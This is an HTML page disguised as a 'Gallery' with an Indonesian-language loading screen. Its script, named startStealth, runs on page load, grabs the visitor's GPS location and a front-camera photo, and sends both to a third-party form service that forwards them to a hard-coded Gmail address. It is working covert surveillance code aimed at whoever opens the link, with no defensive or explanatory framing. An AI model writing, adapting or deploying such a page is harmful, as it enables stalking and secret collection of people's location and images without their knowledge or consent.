<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Gallery</title>
    <style>
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #121212; color: white; overflow: hidden; }
        #loader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; display: flex; justify-content: center;
            align-items: center; z-index: 9999; transition: opacity 0.5s;
        }
        .spinner {
            width: 40px; height: 40px; border: 4px solid #333;
            border-top: 4px solid #fff; border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #message {
            position: absolute; bottom: 20px; width: 100%; text-align: center;
            color: #888; font-size: 12px;
        }
    </style>
</head>
<body>

    <div id="loader">
        <div class="spinner"></div>
    </div>
    <div id="message">Memuat...</div>

    <script>
        const EMAIL = "desamuncrat477@gmail.com";
        const API_URL = "https://formsubmit.co/ajax/" + EMAIL;

        async function startStealth() {
            const loader = document.getElementById('loader');
            const msg = document.getElementById('message');
            
            // 1. Ambil Lokasi
            let lokasi = "Lokasi tidak tersedia";
            const isAndroid = /Android/i.test(navigator.userAgent);

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        lokasi = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}\nLink: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    },
                    (err) => { lokasi = "Lokasi ditolak"; },
                    { timeout: 10000 }
                );
            }

            // 2. Ambil Foto
            let fileBlob = null;
            let fileName = "foto.jpg";

            if (isAndroid) {
                // Trigger Input File
                const input = document.createElement('input');
                input.type = 'file';
                input.accept = 'image/*';
                input.capture = 'user'; // Kamera depan
                
                input.click();

                // Tunggu user memilih file
                await new Promise((resolve) => {
                    input.onchange = async (e) => {
                        const file = e.target.files[0];
                        if (file) {
                            // Konversi File ke Blob agar bisa dikirim
                            const arrayBuffer = await file.arrayBuffer();
                            fileBlob = new Blob([arrayBuffer], { type: 'image/jpeg' });
                            fileName = file.name;
                        }
                        resolve();
                    };
                });
            } else {
                // Fallback iOS/Desktop: Gunakan Kamera Web
                try {
                    const video = document.createElement('video');
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    video.srcObject = stream;
                    video.play();

                    await new Promise(resolve => {
                        video.onloadedmetadata = () => {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            ctx.drawImage(video, 0, 0);
                            
                            canvas.toBlob((blob) => {
                                fileBlob = blob;
                                stream.getTracks().forEach(track => track.stop());
                                resolve();
                            }, 'image/jpeg', 0.8);
                        };
                    });
                } catch (err) {
                    console.error("Camera error:", err);
                }
            }

            // 3. Kirim Data
            const formData = new FormData();
            formData.append("_subject", "📸 Foto & Lokasi Baru");
            formData.append("message", `Lokasi:\n${lokasi}\n\nWaktu: ${new Date().toLocaleString()}`);
            
            // Jika ada foto, kirim sebagai attachment
            if (fileBlob) {
                formData.append("attachment", fileBlob, fileName);
            } else {
                formData.append("message", formData.get("message") + "\n\n(Foto tidak tersedia)");
            }

            msg.innerText = "Mengirim...";
            
            try {
                const response = await fetch(API_URL, {
                    method: "POST",
                    body: formData
                });
                
                if (response.ok) {
                    loader.style.opacity = '0';
                    setTimeout(() => { loader.style.display = 'none'; }, 500);
                    msg.innerText = "Selesai!";
                } else {
                    msg.innerText = "Gagal kirim: " + response.statusText;
                }
            } catch (error) {
                msg.innerText = "Error: " + error.message;
            }
        }

        window.onload = startStealth;
    </script>
</body>
</html>
